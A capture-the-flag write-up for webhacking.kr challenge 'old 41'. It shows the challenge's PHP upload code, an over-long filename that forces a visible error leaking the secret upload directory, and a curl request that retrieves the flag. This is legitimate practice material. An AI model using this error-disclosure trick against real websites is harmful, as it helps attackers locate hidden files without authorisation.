# Old 41    Filenames and Errors

URL: [https://webhacking.kr/challenge/web-19/?view_source=1](https://webhacking.kr/challenge/web-19/?view_source=1)

![old-41.png](/assets/ctf/webhacking.kr/old-41.png)

```php
<?php
include "../../config.php";
include "./inc.php";
if ($_GET["view_source"]) {
    view_source();
}
error_reporting(E_ALL);
ini_set("display_errors", 1);
?><html>
<head>
<title>Challenge 41</title>
</head>
<body>
<?php if (isset($_FILES["up"]) && $_FILES["up"]) {
    $fn = $_FILES["up"]["name"];
    $fn = str_replace(".", "", $fn);
    $fn = str_replace("<", "", $fn);
    $fn = str_replace(">", "", $fn);
    $fn = str_replace("/", "", $fn);

    $cp = $_FILES["up"]["tmp_name"];
    copy($cp, "./{$upload_dir}/{$fn}");
    $f = @fopen("./{$upload_dir}/{$fn}", "w");
    @fwrite($f, $flag);
    @fclose($f);
    echo "Done~";
} ?>
<form method=post enctype="multipart/form-data">
<input type=file name=up><input type=submit value='upload'>
</form>
<a href=./?view_source=1>view-source</a>
</body>
</html>
```

In the PHP code we see that `display_errors` is True meaning if we cause an error we can see it. 
There's also upload feature which takes our file, replaces some characters in name and finally writes flag into the file. 

Tricky part is we don't know where the `$upload_dir` is. 

The limit of filenames on filesystems seems to be capped at 256, if we upload filename with greater size we should cause an error and get the path exposed: 
```bash
└─$ perl -e 'print "A"x300'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

I edited the request with burp as you can't create filename with >256 chars.
```html
Warning: copy(./4b0e87fef7b5e8ba83894970c9806042e5d6ec9a/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAphp): failed to open stream: File name too long in /var/www/html/challenge/web-19/index.php on line 21
Done~
No file chosen

view-source
```

Upload any file, follow filename characters replace rule, visit the file and pwned:
```bash
└─$ curl 'https://webhacking.kr/challenge/web-19/4b0e87fef7b5e8ba83894970c9806042e5d6ec9a/pwnyphp' -b 'PHPSESSID=fqn9tv8tbam8b4gi2edk8vc8bu'
FLAG{error_msg_is_more_userful_than_you_think}   
```